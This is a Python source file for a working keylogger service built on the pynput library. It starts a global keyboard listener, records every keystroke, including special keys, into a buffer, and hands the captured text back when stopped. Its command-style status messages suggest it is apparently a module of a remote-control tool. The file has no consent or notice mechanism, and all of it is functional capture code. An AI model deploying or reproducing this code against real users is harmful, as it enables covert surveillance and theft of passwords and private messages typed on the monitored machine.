from pynput import keyboard
from threading import Lock

SPECIAL_KEYS = {
    keyboard.Key.space: " ",
    keyboard.Key.enter: "[enter]\n",
    keyboard.Key.tab: "[tab]",
    keyboard.Key.backspace: "[backspace]",
    keyboard.Key.delete: "[delete]",
    keyboard.Key.esc: "[esc]",
    keyboard.Key.shift: "[shift]",
    keyboard.Key.shift_r: "[shift]",
    keyboard.Key.ctrl: "[ctrl]",
    keyboard.Key.ctrl_r: "[ctrl]",
    keyboard.Key.alt: "[alt]",
    keyboard.Key.alt_r: "[alt]",
    keyboard.Key.cmd: "[cmd]",
    keyboard.Key.cmd_r: "[cmd]",
    keyboard.Key.up: "[up]",
    keyboard.Key.down: "[down]",
    keyboard.Key.left: "[left]",
    keyboard.Key.right: "[right]",
    keyboard.Key.home: "[home]",
    keyboard.Key.end: "[end]",
    keyboard.Key.page_up: "[page_up]",
    keyboard.Key.page_down: "[page_down]",
}


class KeyloggerService:

    def __init__(self):

        self._listener = None
        self._running = False
        self._buffer = []
        self._lock = Lock()

    # -------------------------

    def start(self):

        if self._running:
            return "Keylogger already running"

        self._buffer.clear()

        self._listener = keyboard.Listener(on_press=self._on_press)

        self._listener.start()

        self._running = True

        return "Keylogger started"

    # -------------------------

    def stop(self):

        if not self._running:
            return "Keylogger not running"

        self._listener.stop()

        self._running = False

        with self._lock:

            data = "".join(self._buffer)
            print("BUFFER:", data)
            self._buffer.clear()

        return data

    # -------------------------

    def _on_press(self, key):

        try:

            if isinstance(key, keyboard.KeyCode):

                k = key.char

                if k is None:
                    return

            else:

                k = SPECIAL_KEYS.get(key, f"[{key.name}]")

            with self._lock:

                self._buffer.append(k)

        except Exception as e:

            print("Keylogger error:", e)
